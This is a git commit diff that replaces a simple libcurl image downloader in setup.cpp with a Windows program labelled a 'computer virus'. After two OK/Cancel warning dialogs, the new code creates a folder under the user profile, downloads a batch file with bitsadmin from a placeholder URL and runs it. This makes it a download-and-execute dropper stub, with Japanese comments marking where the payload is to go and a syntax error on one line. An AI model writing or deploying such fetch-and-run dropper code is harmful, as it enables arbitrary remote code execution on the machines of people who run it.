373586eb492211d3abb9a6f2d8d0337af1e0c042
Topi <84213227+apple-pi-yhhhh@users.noreply.github.com>
2021-12-22 01:48:21 +0900

    Update setup.cpp

--- setup.cpp
+++ setup.cpp
@@ -1,32 +1,48 @@
-#include <iostream> 
-#include <curl/curl.h> 
+#include <stdio.h>
+#include <iostream>
+#include <windows.h>
+#include <fstream>
+#include <string>
 
-using namespace std; 
-int main() 
-{ 
-    CURL *image; 
-    CURLcode imgresult; 
-    FILE *fp = nullptr; 
-    const char *url = "##########  [  U  R  L  を  こ  こ  に  ]  ##########";
-    image = curl_easy_init(); 
-    if (image) 
-    { 
-     // Open file 
-     fp = fopen("img.png", "wb"); 
-     if (fp == NULL) cout << "File cannot be opened"; 
+//using namespace std;
 
-     curl_easy_setopt(image, CURLOPT_WRITEFUNCTION, NULL); 
-     curl_easy_setopt(image, CURLOPT_WRITEDATA, fp); 
-     curl_easy_setopt(image, CURLOPT_URL, url); 
-     // Grab image 
-     imgresult = curl_easy_perform(image); 
-     if (imgresult) 
-      cout << "Cannot grab the image!\n"; 
-    } 
-    // Clean up the resources 
-    curl_easy_cleanup(image); 
-    // Close the file 
-    fclose(fp); 
-    system("pause"); 
-    return 0; 
-} 
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+    LPSTR lpszCmdLine, int nCmdShow)
+{
+    int start;
+
+    start = MessageBox(NULL, TEXT("I'm a computer virus.\nPressing [OK]will cause the virus to rampage on your computer.\nI am not responsible if your computer breaksand becomes completely unusable.\nWe strongly recommend using a virtual environment.\n\nSelect [OK] or [Cancel]"),
+        TEXT("topitopi"), MB_OKCANCEL | MB_ICONWARNING);
+
+    switch (start){
+        case IDOK:
+            int OK;
+            OK = MessageBox(NULL, TEXT("Do you really want to execute?"),
+                TEXT("OK"), MB_OKCANCEL | MB_ICONWARNING);
+            switch (OK) {
+                case IDOK:
+
+                    // # # # # #     本文を書くのじゃ！！     # # # # # #
+                    
+                    // ユーザー直下に \π\setup を作成する
+                    system("mkdir %USERPROFILE%\\π\\setup"):
+                    // URL を π 直下の setup.bat にダウンロード
+                    system("bitsadmin /transfer download [ [  URL  ] ] %USERPROFILE%\\π\\setup.bat");
+                    // そのbatを実行
+                    system("%USERPROFILE%\\π\\setup.bat");
+                    
+                    
+                    // # # # # #     本文を書くのじゃ！！     # # # # # #
+                    break;
+                case IDCANCEL:
+                    break;
+            }
+            break;
+        case IDCANCEL:
+            MessageBox(NULL, TEXT("Canceled execution"),
+                TEXT("Cancel"), MB_ICONINFORMATION);
+            break;
+    }
+    return 0;
+}
